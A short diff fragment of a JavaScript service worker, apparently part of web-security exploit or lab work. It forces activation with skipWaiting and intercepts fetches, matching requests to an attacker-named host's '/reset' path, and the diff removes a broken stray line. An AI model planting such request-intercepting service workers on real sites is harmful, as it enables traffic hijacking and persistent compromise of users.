@@ -6,8 +6,6 @@ self.addEventListener('install', function() {
     self.skipWaiting();
 });
 
-function print(
-
 self.addEventListener('fetch', function(e) {
   let url = new URL(e.request.url);
   if (url == 'https://attacker.georgetian.com/reset') {
